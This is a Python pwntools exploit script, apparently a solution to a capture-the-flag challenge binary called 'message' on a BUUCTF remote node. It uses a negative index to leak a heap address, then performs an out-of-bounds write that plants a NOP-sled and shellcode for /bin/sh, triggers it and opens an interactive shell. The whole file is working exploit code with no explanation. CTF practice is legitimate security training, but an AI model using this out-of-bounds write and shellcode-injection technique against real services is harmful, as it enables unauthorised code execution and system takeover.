from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(n,c):
	cmd(1)
	p.sendlineafter("?\n",str(n))
	for x in range(n):
		p.sendlineafter("e\n",str(c))
def show():
	cmd(3)
def edit(idx,n,c):
	cmd(4)
	p.sendlineafter(":\n",str(idx))
	p.sendlineafter("?\n",str(n))
	for x in range(n):
		p.sendlineafter("e\n",str(c))
context.log_level='debug'
context.arch='amd64'
#p=process('./message')
p=remote('node3.buuoj.cn',29655)
add(1,p64(0xdeadbeef))
edit(-3,1,p64(0xcafebabe))
show()
p.readuntil("0:")
p.readuntil("0:")
heap=u64(p.read(8))-(0x1b2b0b0-0x1b18000)
log.warning(hex(heap))
aim=0x0000000006040f0
now=0x2070090-0x205d000+heap
edit(0,4,"\x00"*0x18)
edit(0,1,"\x00"*0x18)
edit((aim-now)/8,1,(asm(shellcraft.sh())).rjust(0x10000,'\x90'))
cmd(1)
p.sendlineafter("?\n",str(1))
p.interactive('n132>')